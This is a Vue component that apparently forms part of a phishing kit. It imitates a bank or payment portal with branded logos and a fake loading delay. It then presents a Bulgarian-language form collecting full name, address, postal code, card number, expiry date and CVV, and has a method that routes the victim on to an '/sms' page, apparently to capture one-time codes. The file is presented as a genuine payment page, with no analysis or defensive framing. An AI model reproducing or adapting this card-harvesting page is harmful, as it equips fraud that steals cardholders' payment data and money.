<template>
  <div class="container">
    <div id="mainContainer">
      <div class="logo-portal">
        <div class="logo">
          <img src="../img/logo-pb-en.svg" />
        </div>
        <div class="logo-epb"><img src="../img/logo-epb-en.svg"></div>
      </div>
      <div id="login-container" class="ePortalRegForm">
        <br>
        <img v-if="Loding" src="../img/loding.gif" style="position: relative;left: 270px;width: 34px;">
        <div v-if="!Loding">
          <div class="pci-body">
            <div class="row">
              <div class="input-form-group">
                <input id="txtTest" name="cardName" class="creditCardText" autocomplete="off" type="text" placeholder=" " required="">
                <label id="trans-label_postal_code" for="fullname">Пълно име</label>
              </div>
            </div>
            <div class="row">
              <div class="input-form-group">
                <input id="address" name="address" autocomplete="off" type="text" placeholder=" " required="">
                <label id="trans-label_postal_code" for="address">Адрес</label>
              </div>
            </div>
            <div class="row">
              <div class="row">
                <div class="input-form-group">
                  <input id="city" name="city" autocomplete="off" type="text" placeholder=" " required="">
                  <label id="trans-label_postal_code" for="city">Град</label>
                </div>
              </div>
              <div class="input-form-group">
                <input id="zip-code" name="zip" autocomplete="off" type="text" placeholder=" " aria-describedby="zip-code-error" maxlength="8" required="">
                <label id="trans-label_postal_code" for="zip-code">Пощенски код</label>
              </div>
            </div>
            <div class="row">
              <div class="input-form-group">
                <input maxlength="16" onkeyup="cc_format('cardnumber1','cstCCardType');" id="cardnumber1" name="CardNumber" autocomplete="off" type="text" placeholder="0000 0000 0000 0000" required="">
                <label id="trans-cardnumber" for="cardnumber" class="card-label">Номер на карта </label>
                <p id="cardnumber-error" class="field-error" aria-live="assertive"></p>
              </div>
            </div>
            <div class="row">
              <div class="input-form-group">
                <input id="expiry-date" type="text" name="cardExp" autocomplete="cc-exp" placeholder="MM / YY" onkeyup="formatString(event);" maxlength="5" required="">
                <label id="trans-expiration_date" for="expiry-date">Срок на годност</label>
                <p id="expiry-date-error" class="field-error" aria-live="assertive"></p>
              </div>
              <div class="input-form-group">
                <input id="security-code" autocomplete="off" name="cardCvv" type="text" placeholder=" " oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" data-encrypted-name="cvc" aria-describedby="security-code-error" maxlength="3" required="">
                <label id="trans-security_code" style=" width: 18%; " for="security-code">CVV</label>
                <span class="contain-tooltip" data-tooltip="" data-lang="cvc_info"></span>
                <p id="security-code-error" class="field-error" aria-live="assertive"></p>
              </div>
            </div>
            <br>
            <br>
            <div style="text-align: center;">
              <button type="submit" name="wasaz" class="button button--text-arrow">Потвърди</button>
            </div>

          </div>
        </div>
        </div>



    </div>
  </div>
</template>
<script>
export  default {
  name:'Information',
  methods:{
    red(){
      this.$router.push("/sms");
    }
  },
  data(){
    return{
      Loding:true,
      timerCount:5,
    }
  },
  watch:{
    timerCount:{
      handler(value) {
        if (value > 0) {
          setTimeout(() => {
            this.timerCount--;
          }, 1000);
        }else {
          this.Loding=false
        }

      },
      immediate: true
    }
  },
}
</script>
<style>
@import '../css/credit.css';
@import '../css/style.css';
</style>
